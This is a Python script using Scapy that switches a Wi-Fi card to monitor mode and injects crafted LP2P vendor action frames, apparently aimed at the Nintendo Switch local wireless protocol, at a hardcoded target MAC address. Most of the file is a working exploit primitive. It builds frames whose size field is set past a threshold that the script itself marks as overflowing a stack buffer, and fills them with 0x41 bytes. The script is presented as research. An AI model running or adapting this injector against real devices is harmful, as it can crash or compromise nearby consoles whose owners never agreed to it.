#!/usr/bin/env -S python3 -u -I
"""Scapy-based action frame injection for ldn research.

Scapy handles radiotap headers, injection backends, and interface setup
more robustly than raw sockets. This is the recommended injection method.

Usage:
  sudo python3 -I scapy_inject.py --channel 1 --size 0x0100  # safe baseline
  sudo python3 -I scapy_inject.py --channel 1 --size 0x0721  # 1 byte over threshold
  sudo python3 -I scapy_inject.py --test                      # TX capability test

IMPORTANT: Disconnects WiFi while injecting. NetworkManager reconnects after.
"""

import argparse
import os
import struct
import subprocess
import sys
import time

os.environ["SCAPY_USE_LIBPCAP"] = "0"

from scapy.all import (
    RadioTap, Dot11, Dot11Action, Raw,
    sendp, conf, get_if_hwaddr
)


IFACE = "wlp5s0"
SWITCH_MAC = "ec:c4:0d:f3:dc:db"
CHANNEL = 1


def run(cmd, quiet=False):
    if not quiet:
        print(f"  $ {cmd}")
    return subprocess.run(cmd, shell=True, capture_output=True, text=True)


def setup_monitor(iface, channel):
    """Put interface into monitor mode."""
    run(f"nmcli device disconnect {iface}", quiet=True)
    time.sleep(0.5)
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type monitor")
    run(f"ip link set {iface} up")
    run(f"iw dev {iface} set channel {channel}")
    time.sleep(0.5)
    conf.iface = iface


def teardown_monitor(iface):
    """Restore managed mode."""
    run(f"ip link set {iface} down")
    run(f"iw dev {iface} set type managed")
    run(f"ip link set {iface} up")
    run("nmcli device connect wlp5s0", quiet=True)


def build_lp2p_payload(size_field=0x0100, fill=0x41, body_size=0x800):
    """Build LP2P action frame payload."""
    body = bytearray(body_size)
    body[0] = 0x7f  # vendor-specific action
    body[1:4] = b"\x00\x22\xaa"  # OUI: LP2P
    body[4] = 0x04  # OUI type
    body[5] = 0x01
    body[6] = 0x01
    body[7] = 0x01

    body[0x21] = 0x03  # Type 3 parser
    struct.pack_into(">H", body, 0x22, body_size - 0x38)
    body[0x26] = 0x01
    body[0x27] = 0x01

    if body_size > 0x1DC:
        struct.pack_into(">H", body, 0x1DA, size_field)

    for i in range(0x5C, body_size):
        body[i] = fill

    return bytes(body)


def build_frame(src_mac, dst_mac, payload):
    """Build a complete scapy frame for injection."""
    frame = (
        RadioTap() /
        Dot11(
            type=0,       # Management
            subtype=13,   # Action
            addr1=dst_mac,
            addr2=src_mac,
            addr3=dst_mac,
        ) /
        Raw(load=payload)
    )
    return frame


def test_tx(iface, channel):
    """Test if TX injection works."""
    print(f"Testing TX injection on {iface}, channel {channel}...")

    setup_monitor(iface, channel)

    try:
        src_mac = "22:7c:ce:e0:bd:56"
        dst_mac = "ff:ff:ff:ff:ff:ff"

        payload = bytes([0x7f, 0x00, 0x22, 0xaa, 0x04, 0x01, 0x00, 0x00]) + bytes(24)
        frame = build_frame(src_mac, dst_mac, payload)

        print(f"\nSending 5 test frames (broadcast)...")
        sent = 0
        for i in range(5):
            try:
                sendp(frame, iface=iface, verbose=0)
                sent += 1
            except Exception as e:
                print(f"  Frame {i}: {e}")
            time.sleep(0.05)

        print(f"\nResult: {sent}/5 frames accepted by sendp()")
        if sent == 5:
            print("STATUS: sendp() succeeded — but iwlwifi may silently drop")
            print("  To confirm OTA: capture on second radio in monitor mode")
            print("  Or: use USB adapter with known TX support")
        else:
            print("STATUS: TX injection not supported on this card")

        return sent > 0

    finally:
        teardown_monitor(iface)


def inject(iface, channel, dst_mac, size_field, fill, count, body_size):
    """Inject LP2P action frames."""
    setup_monitor(iface, channel)

    try:
        src_mac = "22:7c:ce:e0:bd:56"
        payload = build_lp2p_payload(size_field=size_field, fill=fill, body_size=body_size)
        frame = build_frame(src_mac, dst_mac, payload)

        total_size = len(bytes(frame))
        print(f"\nInjecting {count} LP2P action frames...")
        print(f"  dst={dst_mac}")
        print(f"  size_field=0x{size_field:04X} ({'SAFE' if size_field <= 0x720 else 'OVERFLOW'})")
        print(f"  fill=0x{fill:02X}, body={body_size} bytes")
        print(f"  total frame: {total_size} bytes")

        if size_field > 0x720:
            overflow = size_field - 0x720
            print(f"  OVERFLOW: {overflow} bytes past stack buffer")

        sent = 0
        errors = 0
        t0 = time.time()
        for i in range(count):
            try:
                sendp(frame, iface=iface, verbose=0)
                sent += 1
            except Exception as e:
                errors += 1
                if errors == 1:
                    print(f"  First error: {e}")
            time.sleep(0.01)

        elapsed = time.time() - t0
        print(f"\nResults: {sent}/{count} sent, {errors} errors, {elapsed:.1f}s")
        return sent, errors

    finally:
        teardown_monitor(iface)


def main():
    parser = argparse.ArgumentParser(description="Scapy LP2P injection")
    parser.add_argument("--iface", default=IFACE)
    parser.add_argument("--channel", type=int, default=CHANNEL)
    parser.add_argument("--dst", default=SWITCH_MAC)
    parser.add_argument("--size", type=lambda x: int(x, 0), default=0x0100,
                        help="Size field (hex ok: 0x0100)")
    parser.add_argument("--fill", type=lambda x: int(x, 0), default=0x41)
    parser.add_argument("--count", type=int, default=10)
    parser.add_argument("--body-size", type=lambda x: int(x, 0), default=0x800)
    parser.add_argument("--test", action="store_true", help="Test TX capability only")
    args = parser.parse_args()

    if os.geteuid() != 0:
        print("ERROR: Must run as root")
        sys.exit(1)

    if args.test:
        test_tx(args.iface, args.channel)
    else:
        inject(args.iface, args.channel, args.dst, args.size, args.fill,
               args.count, args.body_size)


if __name__ == "__main__":
    main()
